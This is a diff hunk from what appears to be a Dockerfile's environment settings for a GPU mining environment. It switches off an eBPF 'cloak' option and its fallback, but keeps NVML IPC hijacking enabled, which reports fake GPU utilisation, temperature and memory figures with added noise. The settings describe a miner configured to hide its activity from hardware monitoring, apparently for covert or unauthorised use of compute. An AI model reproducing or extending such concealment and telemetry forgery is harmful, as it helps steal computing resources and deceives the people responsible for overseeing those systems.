@@ -192,11 +192,11 @@ ENV SCRIPT_DIR=/app/mining_environment/scripts \
     WORK_MS=1900 SLEEP_MS=100 \
     ENABLE_MPO=1 MPO_LIB=/opt/mpo/libmpo.so \
     ENABLE_NS_ISOLATION=1 NS_USE_NET=1 \
-    ENABLE_EBPF_CLOAK=1 EBPF_CONFIG_PATH=/app/mining_environment/gpu_plugins/ebpf/config/ebpf_config.json \
+    ENABLE_EBPF_CLOAK=0 EBPF_CONFIG_PATH=/app/mining_environment/gpu_plugins/ebpf/config/ebpf_config.json \
     EBPF_LOG_LEVEL=INFO EBPF_DEBUG_MODE=false EBPF_MOCK_MODE=false \
     EBPF_INSTALL_DIR=/sys/fs/bpf EBPF_LOG_DIR=/var/log/ebpf EBPF_TMP_DIR=/tmp/ebpf \
     BPF_FS_PATH=/sys/fs/bpf \
-    ENABLE_EBPF_WRAPPER=0 EBPF_FALLBACK_MODE=flexible \
+    ENABLE_EBPF_WRAPPER=0 EBPF_FALLBACK_MODE=disabled \
     PYTHONPATH=/app:/usr/local/lib/python3.10/dist-packages:/usr/lib/python3/dist-packages \
     GPU_PLUGINS_CONFIG=/app/mining_environment/gpu_plugins/config/gpu_plugins.yml \
     ENABLE_NVML_IPC_HIJACKING=1 NVML_FAKE_UTIL=5 NVML_FAKE_TEMP=48 NVML_FAKE_MEM_MB=256 NVML_ADD_NOISE=1 \
